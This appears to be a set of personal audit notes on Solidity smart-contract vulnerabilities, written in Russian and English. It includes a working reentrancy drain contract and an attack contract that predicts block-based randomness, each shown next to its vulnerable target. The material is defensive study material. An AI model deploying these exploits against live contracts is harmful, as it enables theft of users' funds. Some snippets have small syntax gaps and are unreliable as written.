## VULNERABLE TX.ORIGIN:  

```
// При вызове функции напрямую пользователем, msg.sender и tx.origin будут одинаковыми — это будет адрес пользователя.
contract Example {
    function checkSender() external view returns (address, address) {
        return (msg.sender, tx.origin);
    }
}

/*
В этом случае:
- msg.sender в контракте Example будет адресом контракта A.
- tx.origin в контракте Example будет адресом пользователя, который инициировал транзакцию.
*/
contract A {
    Example example;
    constructor(address _example) {
        example = Example(_example);
    }

    function callCheckSender() external view returns (address, address) {
        return example.checkSender();  // Вызов функции через другой контракт
    }
}

```

Когда пользователь вызывает контракт через другой контракт, tx.origin будет равен адресу пользователя, а msg.sender будет адресом контракта, который вызвал вашу функцию.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### VULNERABILITI IN ABI.ECNCODEPACKED():  

This function vulnerable to collision: https://docs.soliditylang.org/en/latest/abi-spec.html#non-standard-packed-mode  

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### VULNERABILITY IN SELFDESTRUCT():  

В смарт-контрактах функция **selfdestruct()** - это специальная функция, используемая в основном для прекращения работы контракта при определенных обстоятельствах и освобождения связанных с ним ресурсов.  

Основная цель функции **selfdestruct()** - позволить создателям контрактов уничтожить развернутый смарт-контракт.  

При срабатывании функции **selfdestruct()** смарт-контракт будет окончательно удален, а оставшиеся Ether, хранящиеся в контракте, будут отправлены на указанный целевой адрес. В то же время все данные и функции, связанные с контрактом (хранилище и код удалены из состояния), больше не будут доступны. Функция **selfdestruct()** может использоваться для отказа от контрактов, которые больше не используются, обновления версий контрактов или решения потенциальных проблем безопасности.  

Vulnerable code snippet: ```selfdestruct(payable(msg.sender));``` - после выполнения функции контракт будет уничтожен, а все срадства будут перечисленны на указанный адресс.  

Также, функция **selfdestruction()** может переводить средства без согласия цели. Именно из-за этой "принудительной передачи" функции **selfdestruction()** злоумышленники могут использовать ее, чтобы повлиять на нормальную функциональность целевого контракта. Например, если разработчики используют address(this).balance для извлечения баланса токенов в контракте, они могут быть уязвимы для атаки.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### AUDIT METADATA:  

```solc --metadata [Contract.sol]```

Decode smart contract bytecode : https://playground.sourcify.dev/  

IPFS: https://gateway.pinata.cloud/ipfs/QmVQjAYYszSmEmYKWHusx8TwzF5vTYjCv8PUEJLXUfNjce

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### INTEGER UNDERFLOW AND OVERFLOW:  

https://metaschool.so/articles/integer-overflow-and-underflow-in-solidity  

#### REENTRANCY:  

Vulnerable Contract:  
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract EthBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");
        balances[msg.sender] = 0; // Vulnerability here.
    }
}

```

Exploit code:  

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract EthBankExploit {
    IEthBank public bank;

    constructor(address _bank) {
        bank = IEthBank(_bank);
    }

    receive() external payable { // 
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

#### INSECURE SOURCE OF RANDOMNESS:  

Vulnerable contract:  

```
contract RandomNumber {

    constructor public payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        if (_guess == answer) {
            (bool sent,) = msg.sender.call{value: 1 ether}("");
            require(sent, "Fail");
        }
    }
}
```

Attack contract:  

```
contract Attack {
    fallback() external payable {}

    function attack(RandomNumber randomNumber) {
        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        randomNumber.guess(answer);
    }
}
```

Атакующий контракт, и уязвимый контракт работают в одном блоке, потому что вызов контракта-атакующего инициируется внешним пользователем, и все транзакции, вызванные в рамках этой операции, обрабатываются в контексте одного блока.  

**Эфир и обработка транзакций**:  

В Ethereum каждая транзакция включается в блок и выполняется в рамках его характеристик (например, blockhash, block.timestamp, block.number).
Если одна транзакция вызывает несколько контрактов (через вызовы call или delegatecall), все эти вызовы происходят в том же самом блоке, используя одну и ту же информацию о блоке.

**Контекст вызова**:  

Когда атакующий контракт вызывает уязвимый контракт через: ```randomNumber.guess(answer);```, оба контракта работают в рамках одной транзакции, обработанной майнером.
Таким образом, вызов block.timestamp и blockhash(block.number - 1) в атакующем контракте возвращает те же самые значения, что и в уязвимом контракте, потому что это одна и та же транзакция.  

**Ход выполнения атаки**:  

```
Атакующий разворачивает свой контракт (Attack) и вызывает его функцию attack, передавая адрес уязвимого контракта (RandomNumber).

Вызов функции attack создаёт транзакцию, которая попадает в пул транзакций майнеров и в конечном итоге включается в новый блок.

Когда транзакция обрабатывается:
    Внутри attack вычисляется "случайное" число с помощью keccak256 на основе blockhash(block.number - 1) и block.timestamp.
    Затем вызывается randomNumber.guess(answer), используя тот же контекст блока. Внутри guess повторно вычисляется то же самое значение keccak256, потому что входные данные (хэш блока и метка времени) остаются идентичными.

Уязвимый контракт считает, что _guess совпал с "случайным" числом, и отправляет 1 эфир атакующему.
```

#### UNCHECKED RETURN VALUE:

**Resource**: https://metana.io/blog/unchecked-return-values-hidden-threats-in-smart-contracts/  

Суть уязвимости в том, что после отправки транзацкии возвращаемое значение не проверяется. Транзакция не может выполнить откат до предыдущего состояния.
